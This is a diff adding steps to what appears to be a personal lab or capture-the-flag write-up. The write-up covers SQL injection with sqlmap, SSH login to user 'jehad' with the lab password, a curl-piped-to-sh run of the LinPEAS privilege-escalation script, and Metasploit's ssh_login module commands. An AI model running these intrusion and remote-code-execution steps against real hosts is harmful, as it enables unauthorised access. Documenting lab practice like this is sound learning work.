@@ -20,3 +20,13 @@ After capturing the HTTP request and then saving it as a file, I can run **sqlma
 
 During the scan, the injections are successful and return two tables, a user table and a ssh table. This worked so I can now ssh into jehad's account. I run the command **ssh jehad@192.168.19.129**, input the password **fool** and I'm in the account.
 
+Now that I have access to an account, it's time for privilege escalation. I switched to the tmp folder and tried to run the Linpeas script: **curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh**. This is a script that searches for potential paths to elevate privileges on Linux hosts and highlights them for a better understanding of those instances with potential exploits. This is my first time using this which was really insightful and I will definitely be using this again in other labs. However, I decided to use metasploit. I used the’s SSH auxiliary module:
+
+* msfconsole
+* search ssh type:auxiliary
+* use auxiliary/scanner/ssh/ssh_login
+* set USERNAME jehad
+* set PASSWORD fool
+* set RHOSTS 192.168.19.129
+* run
+
